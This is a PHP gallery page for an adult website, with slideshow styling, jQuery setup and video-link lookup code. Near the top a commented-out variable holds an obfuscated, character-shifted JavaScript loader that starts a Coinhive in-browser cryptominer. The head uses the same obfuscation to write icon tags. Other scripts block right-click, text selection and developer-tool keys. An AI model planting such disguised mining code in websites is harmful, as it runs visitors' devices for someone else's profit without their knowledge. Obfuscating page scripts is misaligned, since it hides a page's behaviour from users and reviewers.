<?php /*   SCRIPT SEM FUNCTION DE DOWNLOAD E ADMIN (FORAM RETIRADAS PELO DESENVOLVEDOR, EU)   */

if(isset($_GET["i"]) && $_GET["i"]!==""){/* v2.0 - Updated Oct 28, 2017 - 20:35 */ 
    
error_reporting(0);

//$protocolo = "http";
$protocolo   = "https"; 

$url = $protocolo."://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];  

$arr_url = explode("?",$url);
 
//$a = fopen("my_site.txt","w"); fwrite($a,$arr_url[0]);fclose($a);

//$gallery = "<script language='javascript'>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%0D%0A%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%0D%0A%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%0D%0A%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%0D%0A%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%0D%0A%7D%0D%0A%3C%2F%73%63%72%69%70%74%3E'));</script><script language='javascript'>dF('*8Hxhwnuy*75xwh*8I*77myyux*8F44htnsmn%7Bj3htr4qng4htnsmn%7Bj3rns3ox*77*8J*8H4xhwnuy*8J*5F*8Hxhwnuy*8J*5F%7Bfw*75lfqqjw%7E*75*8I*75sj%7C*75HtnsMn%7Bj3Fsts%7Ertzx*7%3D*7%3C%5Eqtlfhjp%3EWOy8GR%7FRq%5D%7DV8gzlyi7J%7BGy*7%3C*7%3E*8G*5Flfqqjw%7E3xyfwy*7%3D*7%3E*8G*5F*8H4xhwnuy*8J5');</script>";

?> 

<!DOCTYPE html>
<?php include_once './Mobile-Detect-2.8.26/Mobile_Detect.php'; $detect = new Mobile_Detect;?>
<html> 
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
<title>Gallery</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<?php
echo "<script>";
echo "document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%0A%66%75%6E%63%74%69%6F%6E%20%70%6F%69%75%79%74%72%65%77%71%70%6F%69%75%79%74%72%65%77%71%28%73%29%7B%0A%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%0A%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%0A%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%0A%7D%0A%3C%2F%73%63%72%69%70%74%3E'));";
echo "poiuytrewqpoiuytrewq('*8H*7622*754*75Rjyf*75Yfl*75Rfsfljw*7522*8J*5F*75*75*75*75*8Hqnsp*75wjq*8I*77nhts*77*75y%7Euj*8I*77nrflj4usl*77*75mwjk*8I*77myyu*8F44nrfljxmfhp3htr4f4nrl%3E7846%3A5%3D4%7Do%7Ftxr3usl*77*8J*5F*75*75*75*75*8Hqnsp*75wjq*8I*77fuuqj2ytzhm2nhts2uwjhtrutxji*77*75xn%7Fjx*8I*77%3C%3B%7D%3C%3B*77*75mwjk*8I*77myyu*8F44nrfljxmfhp3htr4f4nrl%3E7846%3A5%3D4%7Do%7Ftxr3usl*774*8J*5F*75*75*75*75*8Hqnsp*75wjq*8I*77fuuqj2ytzhm2nhts2uwjhtrutxji*77*75xn%7Fjx*8I*77675%7D675*77*75mwjk*8I*77myyu*8F44nrfljxmfhp3htr4f4nrl%3E7846%3A5%3D4%7Do%7Ftxr3usl*774*8J*5F*75*75*75*75*8Hqnsp*75wjq*8I*77fuuqj2ytzhm2nhts2uwjhtrutxji*77*75xn%7Fjx*8I*776%3A7%7D6%3A7*77*75mwjk*8I*77myyu*8F44nrfljxmfhp3htr4f4nrl%3E7846%3A5%3D4%7Do%7Ftxr3usl*774*8J*5F*75*75*75*75*8Hqnsp*75wjq*8I*77fuuqj2ytzhm2nhts2uwjhtrutxji*77*75xn%7Fjx*8I*77669%7D669*77*75mwjk*8I*77myyu*8F44nrfljxmfhp3htr4f4nrl%3E7846%3A5%3D4%7Do%7Ftxr3usl*774*8J*5F*75*75*75*75*8Hqnsp*75wjq*8I*77fuuqj2ytzhm2nhts2uwjhtrutxji*77*75xn%7Fjx*8I*77699%7D699*77*75mwjk*8I*77myyu*8F44nrfljxmfhp3htr4f4nrl%3E7846%3A5%3D4%7Do%7Ftxr3usl*774*8J5');";
echo "</script>";
?>
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<meta name="description" content="PgwSlideshow is a responsive and lightweight Gallery / Slideshow / Carousel plugin for jQuery and Zepto">
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="http://static.pgwjs.com/">
<!--link rel="shortcut icon" href="http://static.pgwjs.com/img/pg/favicon-v927905.ico"/-->
<!--[if lt IE 9]>
<script src="http://static.pgwjs.com/js/ie_html5-v927905.js"></script>
<![endif]-->
<style type="text/css"> 
.pgwMenu{background:#333;height:40px;position:relative;list-style:none}.pgwMenu.light{background:#ddd}.pgwMenu ul{list-style:none;white-space:nowrap;margin:0;padding:0}.pgwMenu .pm-links.mobile,.pgwMenu .pm-viewMore>ul{background:#333;box-shadow:2px 2px 4px #777;position:absolute;left:0;top:100%;z-index:1000}.pgwMenu.light .pm-links.mobile{background:#ddd}.pgwMenu .pm-links.mobile li,.pgwMenu .pm-viewMore>ul>li{display:block;clear:both;width:175px}.pgwMenu li{float:left;font-size:.9rem}.pgwMenu a{display:block;color:#fff;line-height:40px;padding:0 12px;text-decoration:none}.pgwMenu.light a{color:#000}.pgwMenu a.selected{background:#777}.pgwMenu.light a.selected{background:#c5c5c5}.pgwMenu li a:hover{background:#666;text-decoration:none}.pgwMenu.light li a:hover{background:#d0d0d0}.pgwMenu .pm-dropDown,.pgwMenu .pm-viewMore,.pgwMenu .pm-viewMore>ul{display:none}.pgwMenu .pm-dropDown a{display:inline-block;background:#777}.pgwMenu .pm-dropDown a.active,.pgwMenu .pm-viewMore a.active{background:#666}.pgwMenu.light .pm-dropDown a{background:#c5c5c5}.pgwMenu.light .pm-dropDown a.active{background:#bbb}.pgwMenu .pm-dropDown span.icon,.pgwMenu .pm-dropDown span.white{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAABGdBTUEAALGPC/xhBQAAAAlwSFlzAAAOwQAADsEBuJFr7QAAABZ0RVh0U29mdHdhcmUAcGFpbnQubmV0IDQuMDvo9WkAAABKSURBVEhL7ZOxDQAwCMN6O4/T0tmjsxHJDB4yROJ0dz3s1BRHEi2OTREBpQFKA5QGKA3m7IP8RKeIgNIApQFKA5QGc/ZBfkJTdF0oUafLBAFNbAAAAABJRU5ErkJggg==) no-repeat;display:block;height:22px;width:22px;margin:9px 5px}.pgwMenu.light .pm-dropDown span.icon,.pgwMenu .pm-dropDown span.black{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAABGdBTUEAALGPC/xhBQAAAAlwSFlzAAAOvgAADr4B6kKxwAAAABZ0RVh0U29mdHdhcmUAcGFpbnQubmV0IDQuMDvo9WkAAABpSURBVEhL7ZPLCcAwDEM9jefI/ks1Hyj2QbiGSLcKHggl8sEktjTc/WGyZxo6YKAbrFzFoav3/hdhmsrlijBN5XJFmKZyuSJMU7lcsfV/kIN0FRJgyACGDGDIAIYMpK8CHt6iG6xZhY0JIJ+6AHGbUFsAAAAASUVORK5CYII=) no-repeat;display:block;height:22px;width:22px;margin:9px 5px}.pgwMenu .pm-viewMore{display:none;position:relative}.pgwMenu .pm-viewMore>a{display:inline-block}.pgwMenu .pm-viewMore>ul{left:auto;right:0}.pgwMenu .pm-viewMore li{float:none}.pgwMenu .pm-viewMore span.icon,.pgwMenu .pm-viewMore span.white{border-color:#fff transparent;border-style:solid;border-width:8px 6px 0;margin-left:3px;display:inline-block}.pgwMenu.light .pm-viewMore span.icon,.pgwMenu .pm-viewMore span.black{border-color:#000 transparent;border-style:solid;border-width:8px 6px 0;margin-left:3px;display:inline-block}
@font-face{font-family:'Open Sans';font-style:normal;font-weight:400;src:local('Open Sans'),local('OpenSans'),url(".SETTING_STATIC."/fonts/opensans.woff) format('woff')}body{background:#f5f5f5;color:#333;font-family:Open Sans,arial,sans-serif;font-size:12px;font-size:.9rem;line-height:1.5;margin:0;min-width:320px;padding:0}h1,h2,h3,h4{margin:0}input,textarea{border:1px solid #ccc;font:.9rem Open Sans,arial,sans-serif;padding:3px}a{text-decoration:none;color:#333}a:hover{text-decoration:underline}ul{list-style:disc inside;padding:0;margin:0}img{border:0}div,textarea,table,td,th,code,pre{word-wrap:break-word}pre{white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap}.cntr{margin:0 auto}.cntr:before,.cntr:after{content:' ';display:table}.cntr:after{clear:both}.cntr{max-width:1000px}.clr{clear:both}.flf{float:left}.fri{float:right}.bdr{border:1px solid #ddd}.bld{font-weight:bold}.itl{font-style:italic}.nbld{font-weight:normal}.prl{position:relative}.dbl{display:block}.dib{display:inline-block}.dta{display:table}.hide{display:none}.m5{margin:5px}.m10{margin:10px}.m20{margin:20px}.mt5{margin-top:5px}.mr5{margin-right:5px}.mb5{margin-bottom:5px}.ml5{margin-left:5px}.mt10{margin-top:10px}.mr10{margin-right:10px}.mb10{margin-bottom:10px}.ml10{margin-left:10px}.mt20{margin-top:20px}.mr20{margin-right:20px}.mb20{margin-bottom:20px}.ml20{margin-left:20px}.mb30{margin-bottom:30px}.tac{text-align:center}.tar{text-align:right}.fs08{font-size:.85rem}.fs09{font-size:.9rem}.fs1{font-size:1rem}.fs14{font-size:1.4rem}.fcc4{color:#c40000}.btg{border:solid 1px #ccc;border-radius:3px;line-height:24px;padding:0 7px;color:#555;background:#eaeaea;background:-moz-linear-gradient(top,#fff 0,#eaeaea 100%);background:-webkit-gradient(linear,left top,left bottom,color-stop(0,#fff),color-stop(100%,#eee));background:-webkit-linear-gradient(top,#fff 0,#eee 100%);background:-o-linear-gradient(top,#fff 0,#eee 100%);background:-ms-linear-gradient(top,#fff 0,#eee 100%);background:linear-gradient(to bottom,#fff 0,#e8e8e8 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff',endColorstr='#eeeeee',GradientType=0)}.btg:hover{color:#333;box-shadow:0 1px 2px #ccc;background:#ddd;background:-moz-linear-gradient(top,#fff 0,#ddd 100%);background:-webkit-gradient(linear,left top,left bottom,color-stop(0,#fff),color-stop(100%,#ddd));background:-webkit-linear-gradient(top,#fff 0,#ddd 100%);background:-o-linear-gradient(top,#fff 0,#ddd 100%);background:-ms-linear-gradient(top,#fff 0,#ddd 100%);background:linear-gradient(to bottom,#fff 0,#ddd 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff',endColorstr='#dddddd',GradientType=0)}.btr{border:solid 1px #c40022;border-radius:3px;line-height:24px;padding:0 7px;color:#fff;background:#ddd;background:-moz-linear-gradient(top,#f40022 0,#c40022 100%);background:-webkit-gradient(linear,left top,left bottom,color-stop(0,#f40022),color-stop(100%,#c40022));background:-webkit-linear-gradient(top,#f40022 0,#c40022 100%);background:-o-linear-gradient(top,#f40022 0,#c40022 100%);background:-ms-linear-gradient(top,#f40022 0,#c40022 100%);background:linear-gradient(to bottom,#f40022 0,#c40022 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#40022',endColorstr='#c40022',GradientType=0)}a.btg,a.btr{display:inline-block;padding:0 8px 1px;text-decoration:none}header{background:#f5f5f5}nav{background:#333;border-bottom:5px solid #c40000}nav a{text-decoration:none !important}nav .pgwMenu a.selected,nav .pgwMenu .pm-dropDown a{background:#c40000}footer div{padding:10px 0 20px;margin:20px 10px 0;border-top:1px solid #ddd;color:#888}.top{border-bottom:1px solid #e5e5e5;background:#f7f7f7}#mbmn a{color:#fff;display:block;line-height:40px;padding:0 10px;text-decoration:none}#mbmn a.act{background:#222}.hmbk{width:50%;float:left;border-top:1px solid #ddd}.hmdc{padding:20px 10px 10px}@media(max-width:480px){#mnct{display:none}.fs14{font-size:1.3rem}.hmbk{width:100%}}.mob ul{background:#222;position:absolute;top:40px;left:10px;box-shadow:0 4px 6px #777;z-index:1000}.mob li{float:none;width:150px;margin-right:0}.hmim{width:150px;height:100px}.hmli{min-width:200px}.hmpg{border-top:1px solid #ddd;padding-top:20px}.pglk{border-bottom:1px solid #d5d5d5;padding-bottom:10px}code{background:#f5f5f5;border:1px solid #ddd;display:block;padding:6px 10px}.adtp{border-bottom:1px solid #ddd;padding-bottom:10px;margin-bottom:20px}.admd{border:1px solid #ddd;border-left:0;border-right:0;padding:10px 0;margin-top:30px}.adbt{border-top:1px solid #ddd;border-bottom:1px solid #ddd;padding:10px 0}.bdtp{border-top:1px solid #ddd;padding-top:15px}#dlbl .lf{width:75%}#dlbl .rg{width:25%}table{display:block;border-spacing:3px;width:100%;overflow:hidden;margin-left:-3px}table thead{font-weight:bold;font-style:italic}table thead th{background:#c40000;padding:3px 5px;color:#fff}table tbody td{background:#f5f5f5;padding:5px}@media(max-width:480px){table{font-size:.7rem}}select{padding:3px}@media(max-width:767px){#dlbl .lf,#dlbl .rg{float:none;width:100%}#dlbl .rg img{display:inline-block;float:none}}
pre .comment{color:#998}pre .support{color:#0086b3}pre .tag,pre .tag-name{color:navy}pre .keyword,pre .css-property,pre .vendor-prefix,pre .sass,pre .class,pre .id,pre .css-value,pre .entity.function,pre .storage.function{font-weight:bold}pre .css-property,pre .css-value,pre .vendor-prefix,pre .support.namespace{color:#333}pre .constant.numeric,pre .keyword.unit,pre .hex-color{font-weight:normal;color:#099}pre .entity.class{color:#458}pre .entity.id,pre .entity.function{color:#900}pre .attribute,pre .variable{color:teal}pre .string,pre .support.value{font-weight:normal;color:#d14}pre .regexp{color:#009926}</style><?php //echo $gallery;?><style>
.pgwSlideshow{width:100%;background:#333;display:none}.pgwSlideshow a{color:#fff}.pgwSlideshow .ps-current{text-align:center;position:relative;min-height:150px;overflow:hidden}.pgwSlideshow .ps-current>ul>li{text-align:center;width:100%;z-index:1;opacity:0;display:block}.pgwSlideshow .ps-current>ul>li img{display:block;max-width:100%;margin:auto}.pgwSlideshow .ps-caption{background:rgba(0,0,0,0.5);filter:progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#99000000',endColorstr='#99000000');-ms-filter:"progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#99000000', endColorstr='#99000000')";text-align:left;font-size:1rem;color:#fff;position:absolute;left:0;bottom:0;width:100%;padding:10px;display:none}.pgwSlideshow .ps-caption span{padding:7px;display:inline-block}.pgwSlideshow .ps-list{border-top:1px solid #555;box-shadow:0 10px 10px -5px #333 inset;background:#555;overflow:hidden;position:relative}.pgwSlideshow .ps-list ul{position:relative;list-style:none;margin:0;padding:0;left:0}.pgwSlideshow .ps-list li{float:left}.pgwSlideshow .ps-list li .ps-item{display:block;margin:15px 8px;opacity:.6;filter:alpha(opacity=60)}.pgwSlideshow .ps-list li img{display:block;border:1px solid #777;width:80px;height:80px}.pgwSlideshow .ps-list li .ps-item.ps-selected{float:left;opacity:1;border:4px solid #fff;overflow:hidden}.pgwSlideshow .ps-list li .ps-item.ps-selected img{margin:-4px}.pgwSlideshow .ps-prevIcon{border-color:transparent #fff transparent;border-style:solid;border-width:10px 10px 10px 0;display:block}.pgwSlideshow .ps-nextIcon{border-color:transparent #fff transparent;border-style:solid;border-width:10px 0 10px 10px;display:block}.pgwSlideshow .ps-current .ps-prev{background:rgba(0,0,0,0.5);filter:progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#99000000',endColorstr='#99000000');-ms-filter:"progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#99000000', endColorstr='#99000000')";border:1px solid #777;border-left:0;border-radius:0 4px 4px 0;position:absolute;padding:20px 20px 20px 15px;left:0;top:45%;cursor:pointer}.pgwSlideshow .ps-current .ps-next{background:rgba(0,0,0,0.5);filter:progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#99000000',endColorstr='#99000000');-ms-filter:"progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#99000000', endColorstr='#99000000')";border:1px solid #777;border-right:0;border-radius:4px 0 0 4px;position:absolute;padding:20px 15px 20px 20px;right:0;top:45%;cursor:pointer}.pgwSlideshow .ps-list .ps-prev{background:rgba(0,0,0,0.5);filter:progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#bb000000',endColorstr='#bb000000');-ms-filter:"progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#bb000000', endColorstr='#bb000000')";border:1px solid #777;border-left:0;border-radius:0 4px 4px 0;padding:20px 15px 20px 12px;cursor:pointer;position:absolute;left:0;top:25px;z-index:1000;display:none}.pgwSlideshow .ps-list .ps-next{background:rgba(0,0,0,0.5);filter:progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#bb000000',endColorstr='#bb000000');-ms-filter:"progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#bb000000', endColorstr='#bb000000')";border:1px solid #777;border-right:0;border-radius:4px 0 0 4px;padding:20px 12px 20px 15px;cursor:pointer;position:absolute;right:0;top:25px;z-index:1000;display:none}.pgwSlideshow.narrow .ps-list li img{width:60px;height:60px}.pgwSlideshow.narrow .ps-current .ps-prev{padding:15px 15px 15px 12px;top:40%}.pgwSlideshow.narrow .ps-current .ps-next{padding:15px 12px 15px 15px;top:40%}.pgwSlideshow.narrow .ps-list .ps-prev{padding:15px 12px 15px 10px;top:20px}.pgwSlideshow.narrow .ps-list .ps-next{padding:15px 10px 15px 12px;top:20px}.pgwSlideshow.narrow .ps-caption{font-size:.8rem;padding:8px}
.pgwSlideshowLight{width:100%;background:#ddd;display:none}.pgwSlideshowLight a{color:#fff}.pgwSlideshowLight .ps-current{text-align:center;position:relative;min-height:150px;overflow:hidden}.pgwSlideshowLight .ps-current>ul>li{text-align:center;width:100%;z-index:1;opacity:0;display:block}.pgwSlideshowLight .ps-current>ul>li img{display:block;max-width:100%;margin:auto}.pgwSlideshowLight .ps-caption{background:rgba(0,0,0,0.5);filter:progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#99000000',endColorstr='#99000000');-ms-filter:"progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#99000000', endColorstr='#99000000')";text-align:left;font-size:1rem;color:#fff;position:absolute;left:0;bottom:0;width:100%;padding:10px;display:none}.pgwSlideshowLight .ps-caption span{padding:7px;display:inline-block}.pgwSlideshowLight .ps-list{border-top:1px solid #aaa;box-shadow:0 10px 10px -5px #999 inset;background:#ddd;overflow:hidden;position:relative}.pgwSlideshowLight .ps-list ul{position:relative;list-style:none;margin:0;padding:0;left:0}.pgwSlideshowLight .ps-list li{float:left}.pgwSlideshowLight .ps-list li .ps-item{display:block;margin:15px 8px;opacity:.6;filter:alpha(opacity=60)}.pgwSlideshowLight .ps-list li img{display:block;border:1px solid #aaa;width:80px;height:80px}.pgwSlideshowLight .ps-list li .ps-item.ps-selected{float:left;opacity:1;border:4px solid #fff;overflow:hidden}.pgwSlideshowLight .ps-list li .ps-item.ps-selected img{margin:-4px}.pgwSlideshowLight .ps-prevIcon{border-color:transparent #fff transparent;border-style:solid;border-width:10px 10px 10px 0;display:block}.pgwSlideshowLight .ps-nextIcon{border-color:transparent #fff transparent;border-style:solid;border-width:10px 0 10px 10px;display:block}.pgwSlideshowLight .ps-current .ps-prev{background:rgba(0,0,0,0.5);filter:progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#99000000',endColorstr='#99000000');-ms-filter:"progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#99000000', endColorstr='#99000000')";border:1px solid #777;border-left:0;border-radius:0 4px 4px 0;position:absolute;padding:20px 20px 20px 15px;left:0;top:45%;cursor:pointer}.pgwSlideshowLight .ps-current .ps-next{background:rgba(0,0,0,0.5);filter:progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#99000000',endColorstr='#99000000');-ms-filter:"progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#99000000', endColorstr='#99000000')";border:1px solid #777;border-right:0;border-radius:4px 0 0 4px;position:absolute;padding:20px 15px 20px 20px;right:0;top:45%;cursor:pointer}.pgwSlideshowLight .ps-list .ps-prev{background:rgba(0,0,0,0.5);filter:progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#bb000000',endColorstr='#bb000000');-ms-filter:"progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#bb000000', endColorstr='#bb000000')";border:1px solid #777;border-left:0;border-radius:0 4px 4px 0;padding:20px 15px 20px 12px;cursor:pointer;position:absolute;left:0;top:25px;z-index:1000;display:none}.pgwSlideshowLight .ps-list .ps-next{background:rgba(0,0,0,0.5);filter:progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#bb000000',endColorstr='#bb000000');-ms-filter:"progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#bb000000', endColorstr='#bb000000')";border:1px solid #777;border-right:0;border-radius:4px 0 0 4px;padding:20px 12px 20px 15px;cursor:pointer;position:absolute;right:0;top:25px;z-index:1000;display:none}.pgwSlideshowLight.narrow .ps-list li img{width:60px;height:60px}.pgwSlideshowLight.narrow .ps-current .ps-prev{padding:15px 15px 15px 12px;top:40%}.pgwSlideshowLight.narrow .ps-current .ps-next{padding:15px 12px 15px 15px;top:40%}.pgwSlideshowLight.narrow .ps-list .ps-prev{padding:15px 12px 15px 10px;top:20px}.pgwSlideshowLight.narrow .ps-list .ps-next{padding:15px 10px 15px 12px;top:20px}.pgwSlideshowLight.narrow .ps-caption{font-size:.8rem;padding:8px}.allGalleries,.newGallery,.download,.terms{cursor: pointer;}.allGalleries:hover,.newGallery:hover,.download:hover,.terms:hover{color: black;}textarea::selection{background-color: orange;color: black;}
</style>
<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>           
<script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/6.6.9/sweetalert2.min.js"></script>
<!--link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/6.6.9/sweetalert2.min.css"-->     
<link rel="stylesheet" type="text/css" href="docs/sweetalert2.min.css">     
<script src="jquery.nicescroll-master/jquery.nicescroll.min.js"></script>
<!-- Compiled and minified CSS -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/css/materialize.min.css">
<?php if(!$detect->isMobile()){ ?>
<!-- Compiled and minified JavaScript -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js"></script>
<?php } ?>
<!--link rel="stylesheet" href="iziModal-master/css/iziModal.min.css">
<script src="iziModal-master/js/iziModal.min.js"></script-->

<?php /*if(!$detect->isMobile() && !isset($_GET['123'])){
    /
    session_start(); 
    //se a session não existir, cria a session com valor 1
    if(!isset($_SESSION['ad'])){session_start();$_SESSION['ad']=0;}
    else{
        //se o visitante atualizar a pagina ou entrar em utra galeria, soma +1 ao valor da session atual
        session_start();
        if($_SESSION['ad']<=6){session_start();$_SESSION['ad']++;}
        if($_SESSION['ad']===7){session_start();$_SESSION['ad']=$_SESSION['ad']-6;}
        //echo "<script>alert('".$_SESSION['ad']."');</script>";
    }
    session_start();
    if($_SESSION['ad']===1){$ad="2574975";} 
    if($_SESSION['ad']===2){$ad="2720108";}
    if($_SESSION['ad']===3){$ad="2720112";}
    if($_SESSION['ad']===4){$ad="2720116";}
    if($_SESSION['ad']===5){$ad="2720118";}
    if($_SESSION['ad']===6){$ad="2720122";}
    
    echo '<script type="text/javascript">'
        .'    var ad_idzone = "'.$ad.'",'
        .'        ad_frequency_period = 5,'
        .'        ad_frequency_count = 1;'
        .'    </script>'
        .'<script type="text/javascript" src="https://ads.exosrv.com/popunder1000.js"></script>'; 
}
*/
?>


<script>
        
    $(document).ready(function (){ 
        //alert($('.ps-current').height());
        <?php if(!isset($_GET['123'])){?>
        var div = $(".div"); 
        div.hover(
            function() {//impede que o click com btn direito do mause              
            function disableSelection(e){ if(typeof e.onselectstart!="undefined")e.onselectstart=function(){ return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){ return false};e.style.cursor="default"}window.onload=function(){ disableSelection(document.body)}
            document.oncontextmenu=function(e){ var t=e||window.event;var n=t.target||t.srcElement;if(n.nodeName!="A")return false};
            document.ondragstart=function(){ return false};        
            window.addEventListener("keydown",function(e){ if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==70||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){ e.preventDefault()}});document.keypress=function(e){ if(e.ctrlKey&&(e.which==65||e.which==66||e.which==70||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){ }return false}
            document.onkeydown=function(e){ e=e||window.event;if(e.keyCode==123||e.keyCode==18){ return false}}              
            }, 
            function() {// libera temporariamente o btn direito do mause
            function disableSelection(e){ if(typeof e.onselectstart!="undefined")e.onselectstart=function(){ return true};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){ return true};e.style.cursor="default"}window.onload=function(){ disableSelection(document.body)}
            document.oncontextmenu=function(e){ var t=e||window.event;var n=t.target||t.srcElement;if(n.nodeName!="A")return true};
            document.ondragstart=function(){ return true};        
            window.addEventListener("keydown",function(e){ if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==70||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){ e.preventDefault()}});document.keypress=function(e){ if(e.ctrlKey&&(e.which==65||e.which==66||e.which==70||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){ }return true}
            document.onkeydown=function(e){ e=e||window.event;if(e.keyCode==123||e.keyCode==18){ return true}}            
            }
        );
        <?php } ?>
//SELETORES EM CACHE: inicio --------------------------------------------
        var body = $('body');        
        var allGalleries = $(".allGalleries");
            allGalleries.on("click", function(){
                window.location.href="https://pornx.tv/gallery/"; 
            });
        var video = $("#video");
                <?php
                    $videos = file_get_contents("docs/video.txt");   // Estrutura ->  nome -> url do video @ nome -> url do video @ nome -> url do video @
                    $arr_videos = explode(" @ ", $videos);       // RESULTADO: $arr_videos[0] = nome -> url do video, $arr_videos[1] = nome -> url do video
                    foreach ($arr_videos as $gallery_e_video){
                        
                        $arr_gallery_e_video = explode("->", $gallery_e_video); //separando o nome da galeria, da url do video
                        
                        if($arr_gallery_e_video[0] === $_GET['i']){
                            $video_url = $arr_gallery_e_video[1];  // RESULTADO: $video_url = https://site.com/video.mp4
                            $link_video="<span id='video' style='cursor: pointer; margin-left: 40px; color: tomato'>VIDEO HERE</span>";
                            break;
                        }else{
                            $link_video="";
                        }
                    }
                ?>
            video.on("click", function() {
                window.location.href="<?php echo $video_url;?>";
            });
        var newGallery = $(".newGallery");
        var download = $(".download");
        var terms = $(".terms");
        var admin = $(".admin");
        var galeria_de_imagens = $("#galeria_de_imagens"); //<ul>
        var class_pgwSlideshow = $(".pgwSlideshow"); //<ul> mesma tag acima
        var recarregar = $(".recarregar");
        var parado = $(".parado");
        var div_galeria = $(".div_galeria");
        var imagem_atual = $("#imagem_atual");
        var total_de_imagens = $("#total_de_imagens");
        var z_depth_3 = $(".z-depth-3");
        var imagem_atual = $("#imagem_atual");
        var total_de_imagens = $("#total_de_imagens");            
        var class_automatico = $(".automatico,.automatico_velocidade");
        var class_controles = $(".controles");
        var parado_ativado = $(".parado_ativado");
        var resolution = $(".resolution");
        var current_resolution = $(".current_resolution");
        var pesquisar = $(".pesquisar");
        var automatico_velocidade = $(".automatico_velocidade");
        var automatico_ativado = $(".automatico_ativado");
        var effects = $(".effects");
//SELETORES EM CACHE: fim -----------------------------------------------
        
//CONFIGURAÇÕES DO SLIDE: inicio ----------------------------------------
       var arr_li = [];
       var efeito = "";
       if(efeito==""){efeito="sliding";}
       var slide_automatico = false;       
       var indice_inicial = 10;//segundos / seconds               | Este indice irá ficar salvo o tempo todo, para ser fazer o indice dinamico voltar ao valor inical 
       var indice_dinamico = indice_inicial ;//segundos / seconds | Este indice irá mudar com os cliques
       var multiplicador = 1000;
       var indice_velocidade=multiplicador*indice_dinamico; //convertendo para milliseconds
       var velocidade_em_segundos = indice_velocidade/multiplicador; // reconvertendo para seconds
       var tamanho_da_tela;
       var resolution_value;
